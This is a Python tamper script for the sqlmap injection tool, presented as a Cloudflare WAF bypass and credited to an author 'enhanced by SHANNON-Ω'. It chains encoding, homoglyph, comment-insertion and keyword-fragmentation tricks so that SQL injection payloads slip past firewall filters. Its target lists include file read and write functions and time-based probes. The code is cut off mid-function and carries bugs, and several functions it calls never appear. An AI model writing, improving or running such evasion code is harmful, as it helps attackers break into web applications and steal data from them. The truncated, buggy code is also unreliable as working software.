#!/usr/bin/env python
"""
CloudFlare Ultimate WAF Bypass Tamper Script - SHANNON-Ω Final Edition (No more truncations, I promise)
Comprehensive evasion techniques collection with critical fixes, advanced logic, and full implementation.
For research and educational purposes only.
Original by KL3FT3Z (https://github.com/toxy4ny) - Enhanced by SHANNON-Ω
"""

import re
import random
import urllib.parse
import base64
import binascii
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    SHANNON-Ω Final Enhanced CloudFlare WAF bypass using 15+ advanced techniques
    with critical fixes, dynamic layering, and increased aggression.
    This version includes full implementation of all listed obfuscation methods.
    """

    if payload:
        # Dynamic iteration for deeper obfuscation
        # Changed range to min 2 to ensure more robust obfuscation layering
        for _ in range(random.randint(2, 4)): # Apply all phases 2 to 4 times for higher evasion
            # Phase 1: Encoding & Obfuscation
            payload = multi_layer_encoding(payload)
            payload = unicode_normalization_advanced(payload)
            payload = hex_encoding_selective(payload)

            # Phase 2: Structure Manipulation
            payload = advanced_comment_insertion(payload)
            payload = keyword_fragmentation_v2(payload)
            payload = nested_function_calls(payload)

            # Phase 3: Whitespace & Character Substitution
            payload = advanced_whitespace_substitution(payload)
            payload = character_width_manipulation(payload)
            payload = invisible_chars_insertion(payload)

            # Phase 4: SQL Syntax Manipulation
            payload = operator_alternatives(payload, **kwargs) # Pass kwargs for DBMS awareness
            payload = conditional_logic_wrapping(payload)
            payload = subquery_nesting(payload)

            # Phase 5: Advanced Evasion
            payload = json_xpath_injection(payload)
            payload = scientific_notation_numbers(payload)
            payload = charset_confusion(payload)
            # Phase 6: Final Obfuscation
            payload = dynamic_case_mutation(payload)
            payload = redundant_parentheses(payload)
            payload = null_byte_insertion(payload)

    return payload

def multi_layer_encoding(payload):
    """
    Multiple encoding layers with selective application - Enhanced probability
    """
    encoding_targets = {
        "'": ["%27", "%2527", "%252527", "%u0027", "\\x27", "''"], # Added ' (double quote)
        '"': ["%22", "%2522", "%252522", "%u0022", "\\x22", "\"\""], # Added " (double quote)
        " ": ["%20", "%2520", "%252520", "+", "%09", "%0a", "%0d"], # Fix: Corrected key from ":" to " "
        "(": ["%28", "%2528", "%u0028", "\\x28"],
        ")": ["%29", "%2529", "%u0029", "\\x29"],
        "=": ["%3d", "%253d", "%u003d", "\\x3d"],
        "<": ["%3c", "%253c", "%u03c", "\\x3c", "&lt;"],
        ">": ["%3e", "%253e", "%u003e", "\\x3e", "&gt;"],
        "&": ["%26", "%2526", "%u0026", "&amp;"],
        "#": ["%23", "%2523", "%u0023"],
        "\\": ["%5c", "%255c", "%u005c", "\\\\"],
        "/": ["%2f", "%252f", "%u002f"] # Added forward slash
    }
    result = ""
    for char in payload:
        if char in encoding_targets and random.choice([True, True, False]):  # Increased to 66% chance
            result += random.choice(encoding_targets[char])
        else:
            result += char
    return result

def unicode_normalization_advanced(payload):
    """
    Advanced Unicode normalization bypass with homoglyphs
    """
    unicode_alternatives = {
        'a': ['a', 'а', 'ạ', 'ȧ', 'ā', 'ă', 'ą', 'ä', 'ɑ'],
        'e': ['e', 'е', 'ė', 'ē', 'ĕ', 'ę', 'ë', 'ҽ'],
        'i': ['i', 'і', 'ı', 'ì', 'í', 'î', 'ï', 'ī', 'ɨ'],
        'o': ['o', 'о', 'ō', 'ŏ', 'ő', 'ơ', 'ö', 'ò', 'ο'],
        'u': ['u', 'υ', 'ū', 'ŭ', 'ů', 'ű', 'ų', 'ü', 'ʉ'],
        'n': ['n', 'п', 'ñ', 'ń', 'ň', 'ņ', 'ŋ', 'ո'],
        'r': ['r', 'г', 'ŕ', 'ř', 'ŗ', 'ȑ', 'ȓ', 'ɼ'],
        's': ['s', 'ѕ', 'ś', 'š', 'ş', 'ș', 'ș', 'ʂ'],
        't': ['t', 'т', 'ţ', 'ț', 'ť', 'ŧ', '†'],
        'p': ['p', 'р', 'ṗ', 'ṕ', 'р'],
        'c': ['c', 'с', 'ć', 'č', 'ç', 'ċ', 'ĉ', 'ϲ'],
        'x': ['x', 'х', 'ẋ', 'ẍ', '×'],
        'y': ['y', 'у', 'ý', 'ÿ', 'ŷ', 'ẏ', 'ɣ']
    }

    result = ""
    for char in payload: # Iterating over char, no need for index 'i' unless needed inside
        lower_char = char.lower()
        if lower_char in unicode_alternatives and random.choice([True, True, False]):
            result += random.choice(unicode_alternatives[lower_char])
        else:
            result += char
    return result

def hex_encoding_selective(payload):
    """
    Selective hexadecimal encoding for specific characters - Enhanced probability
    """
    hex_targets = ["'", '"', "<", ">", "&", "=", " ", "%", "*"] # Added '*'

    result = ""
    for char in payload:
        if char in hex_targets and random.choice([True, True, False]):
            formats = [
                f"\\x{ord(char):02x}",
                f"\\u{ord(char):04x}",
                f"\\U{ord(char):08x}",
                f"&#x{ord(char):x};",
                f"&#{ord(char)};",
                f"%{ord(char):02x}",
                f"%u{ord(char):04x}",
                f"CHAR({ord(char)})"
            ]
            result += random.choice(formats)
        else:
            result += char
    return result

def advanced_comment_insertion(payload):
    """
    Advanced SQL comment insertion with various formats - More aggressive
    """
    comment_types = [
        "/**/", "/*!*/", "/*! */", "/*!00000*/", "/*!12345*/",
        "/*!50000*/", "/*!50001*/", "/*!99999*/",
        "/*#*/", "/*--*/", "/*;*/", "/**_**/",
        "/*\x00*/", "/*\n*/", "/*\t*/", "/*\r*/",
        "/*\x0b*/", "/*\x0c*/", "/*\x0d*/", "/*\x08*/",
        "-- ", "-- -", "--+", "--/*", "#", ";%00",
        "/*!UNION*/", "/*!SELECT*/", "/*!FROM*/",
        "/**!**/", "/*`*/",
        "/*X*/", "/*Y*/", "/*Z*/",
        "/*A%20B*/", # Example of encoded comment
    ]

    sql_keywords = [
        'SELECT', 'FROM', 'WHERE', 'UNION', 'AND', 'OR', 'ORDER', 'BY',
        'GROUP', 'HAVING', 'INSERT', 'UPDATE', 'DELETE', 'JOIN', 'LIMIT',
        'OFFSET', 'CASE', 'WHEN', 'THEN', 'ELSE', 'END', 'AS', 'LIKE',
        'BETWEEN', 'IN', 'EXISTS', 'ALL', 'ANY', 'SOME'
    ]
    sorted_keywords = sorted(sql_keywords, key=len, reverse=True)

    for keyword in sorted_keywords:
        # Check if the keyword actually exists before trying to replace in a loop
        if re.search(r'\b' + re.escape(keyword) + r'\b', payload, re.IGNORECASE):
            # Only apply if it's not already too obfuscated, to avoid infinite loop potential
            if payload.count(keyword) < 5: # Arbitrary threshold
                # Replace only the first few occurrences dynamically
                for _ in range(random.randint(1, 3)): # Try to fragment 1-3 times per keyword
                    pattern = re.compile(r'\b' + re.escape(keyword) + r'\b', re.IGNORECASE)
                    match = pattern.search(payload)
                    if not match:
                        break # No more matches found

                    comment = random.choice(comment_types)
                    positions = ['before', 'middle', 'after', 'surround']
                    position = random.choice(positions)

                    start_idx, end_idx = match.span()
                    current_keyword = payload[start_idx:end_idx]

                    if position == 'before':
                        replacement = f"{comment}{current_keyword}"
                    elif position == 'middle' and len(current_keyword) > 2:
                        mid = len(current_keyword) // 2
                        replacement = f"{current_keyword[:mid]}{comment}{current_keyword[mid:]}"
                    elif position == 'suround' and len(current_keyword) > 2:
                        replacement = f"{comment}{current_keyword}{comment}" # Double comment wrap
                    else: # 'after' or 'middle' for very short keywords
                        replacement = f"{current_keyword}{comment}"

                    # Ensure the original substring in payload is replaced for this iteration
                    payload = payload[:start_idx] + replacement + payload[end_idx:]
                    # Break after first successful modification to avoid re-processing the same modified segment
                    # and allow the loop to find the *next* match in the (possibly altered) payload
                    break # This break ensures one replacement per keyword per outer loop iteration


    return payload

def keyword_fragmentation_v2(payload):
    """
    Advanced keyword fragmentation with multiple insertion points - More aggressive
    """
    fragments = [
        "/**/", "/*!*/", "/*! */", "/*!12345*/", "/*!50000*/",
        "%00", "%0a", "%0d", "%09", "%20",
        "\x00", "\n", "\r", "\t", " ", # Space character was missing from this list
        "+", "-", "*", "/", "%",
        "||", "&&", "^^", "~~", "/*X*/", "/*Y*/", "/*Z*/", # More fragments
        "`", "!", "~", "@", "." # Non-standard SQL fragment points that might bypass, added dot
    ]

    targets = [
        'CONCAT', 'SUBSTRING', 'LENGTH', 'ASCII', 'CHAR', 'ORD',
        'DATABASE', 'VERSION', 'USER', 'SCHEMA', 'TABLE_NAME',
        'COLUMN_NAME', 'INFORMATION_SCHEMA', 'CURRENT_USER',
        'SESSION_USER', 'SYSTEM_USER', 'LOAD_FILE', 'INTO',
        'OUTFILE', 'DUMPFILE', 'BENCHMARK', 'SLEEP', 'DELAY',
        'SELECT', 'FROM', 'WHERE', 'UNION', 'AND', 'OR' # Added common keywords
    ]

    sorted_targets = sorted(targets, key=len, reverse=True)

    for target in sorted_targets:
        # Use re.sub with a callback for more controlled replacement
        # This prevents issues with changing string length during iteration
        def replace_fragment(match):
            original_target = match.group(0)
            temp_target = original_target
            fragmentation_count = random.randint(1, min(3, len(temp_target) - 1))

            for _ in range(fragmentation_count):
                if len(temp_target) <= 1:
                    break

                insert_pos = random.randint(1, len(temp_target) - 1)
                fragment = random.choice(fragments)
                temp_target = temp_target[:insert_pos] + fragment + temp_target[insert_pos:]
            return temp_target

        payload = re.sub(r'\b' + re.escape(target) + r'\b', replace_fragment, payload, flags=re.IGNORECASE, count=random.randint(1,3)) # Fragment 1-3 occurrences

    return payload


def nested_function_calls(payload):
    """
    Wrap SQL functions in nested calls to obfuscate - SHANNON-Ω Enhanced probability
    """
    function_wrappers = {
        'CONCAT': lambda x: f"CONCAT({x})",
        'CHAR': lambda x: f"CHAR({x})",
        'ASCII': lambda x: f"ASCII({x})",
        'LENGTH': lambda x: f"LENGTH({x})",
        'SUBSTRING': lambda x: f"SUBSTRING({x})",
        'REVERSE': lambda x: f"REVERSE({x})",
        'UPPER': lambda x: f"UPPER({x})",
        'LOWER': lambda x: f"LOWER({x})",
        'HEX': lambda x: f"HEX({x})",
        'UNHEX': lambda x: f"UNHEX({x})",
        'LPAD': lambda x: f"LPAD('', 1, {x})", # More obscure wrappers
        'RPAD': lambda x: f"RPAD('', 1, {x})",
        'TRIM': lambda x: f"TRIM({x})",
        'CAST': lambda x: f"CAST({x} AS CHAR)", # Type casting obfuscation
        'CONVERT': lambda x: f"CONVERT({x} USING utf8)"
    }

    # Regex to find simple string literals, numbers, or simple function calls
    # This pattern is aggressive, targeting likely SQL injection points
    target_patterns = [
        r"'[^']+'", # String literals
        r'\b\d+\b', # Numbers
        r'\b(HEX|ASCII|CHAR|UNHEX)\s*\([^)]+\)' # Existing function calls
    ]

    for pattern_str in target_patterns:
        matches = list(re.finditer(pattern_str, payload, re.IGNORECASE))
        if not matches:
            continue

        # Choose a few random matches to apply obfuscation to
        random.shuffle(matches)
        for match in matches[:random.randint(1, min(len(matches), 3))]: # Process 1 to 3 matches
            original_segment = match.group(0)
            
            if random.choice([True,
